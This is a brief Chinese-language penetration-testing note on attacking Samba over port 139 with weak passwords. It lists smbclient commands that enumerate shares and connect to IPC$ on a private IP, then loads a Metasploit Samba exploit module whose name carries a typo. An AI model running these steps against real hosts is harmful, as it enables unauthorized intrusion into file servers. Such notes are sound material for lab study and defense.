	端口一般139，弱口令连接
	>smbclient -L 192.168.0.110
	>smbclient '\\192.168.0.110\IPC$'
	>use exploit/linux/samba/is_known_pipenamea
